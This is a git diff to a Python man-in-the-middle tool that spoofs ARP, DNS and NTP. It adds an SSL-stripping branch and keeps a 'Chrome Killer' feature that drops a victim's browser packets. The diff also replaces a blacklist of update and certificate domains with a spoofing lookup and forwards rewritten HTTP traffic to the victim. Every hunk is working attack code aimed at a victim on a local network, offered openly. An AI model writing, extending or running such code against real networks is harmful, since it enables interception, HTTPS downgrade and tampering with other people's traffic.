@@ -7,30 +7,23 @@ import spoofing.utils.arp_util as arp_util
 import spoofing.utils.dns_local as dns_local
 from spoofing.objects.http_ex  import HTTP
 from  utils.printing import Printing
-from spoofing.spoofers import ntp_spoof  , dns_spoof
+from spoofing.spoofers import ntp_spoof  , dns_spoof,http_spoofer
 from spoofing.utils import utils 
+from spoofing.urlspoof.spoofer import isSpoofed 
+import traceback
 
-ntpSpoofed = False 
+
     
 def validateDNS(packet:DNS)->bool: 
     ''' checks if the packet is a valid DNS packet for spoofing '''
-    BlackList ={
-        "cacerts.digicert.com",
-        "clients2.google.com",
-        "fedoraproject.org", 
-        "pki.goog",
-        "update.googleapis.com",
-        "data.iana.org",
-        "2.fedora.pool.ntp.org",
-    } 
+  
     try: 
         name : str  = packet[DNSQR].qname.decode()[:-1]
-        if ntpSpoofed and DNSQR in packet and name not in BlackList: 
-            return True 
+        return  DNSQR in packet and isSpoofed(name)
     except: 
         ...
     if DNSQR in packet : 
-        Printing.printError(packet[DNSQR].qname.decode())
+        Printing.printError(name)
     return False  
 
 def validateHttp(rawp:bytes)->bool:
@@ -42,9 +35,9 @@ def validateHttp(rawp:bytes)->bool:
         return False 
       
 def chromeExploitBanner(): 
-    Printing.printWarning("🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯")
+    Printing.printWarning("🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯")
     Printing.printWarning("🤯Chrome Killer in action broooo🤯")
-    Printing.printWarning("🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯")
+    Printing.printWarning("🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯")
 
 def throworkill(packet:Ether,routerMac:str , victimMac:str ,spoofedIp :str ,  interface:str , finishChrome : bool )-> None:
     ''' if the packet is matching to any kind of spoofing it is spoofing it other wise it just doing ip forwarding  '''
@@ -65,7 +58,11 @@ def throworkill(packet:Ether,routerMac:str , victimMac:str ,spoofedIp :str ,  in
             if  finishChrome and  httpPack and httpPack.chromeKillerAvailable() : 
                 Printing.printWarning(httpPack)
                 chromeExploitBanner()
-                return 
+                return  #drop packet 
+            elif httpPack and httpPack.sslStripavailable() : 
+                Printing.printSuccess("...Catched SSL STRIPING...")
+                http_spoofer.http_spoof(httpPack)
+                Printing.printSuccess(httpPack)
             else : 
                 Printing.printNotes(httpPack)
             packet = utils.tcpCopy(packet, sourceMac=routerMac , dstMac=  victimMac )/Raw(httpPack.toRaw())
@@ -78,7 +75,7 @@ def throworkill(packet:Ether,routerMac:str , victimMac:str ,spoofedIp :str ,  in
         # forward the packet 
         sendp(packet,iface=interface,verbose=False) 
     except Exception as e : 
-        Printing.printError(e)
+        Printing.printError(traceback.format_exc())
 
 def HttpDnsSpoofer(victim : str , interface : str , finishChrome : bool )->None:
     ''' gather all the data and start the threads for the spoofing '''
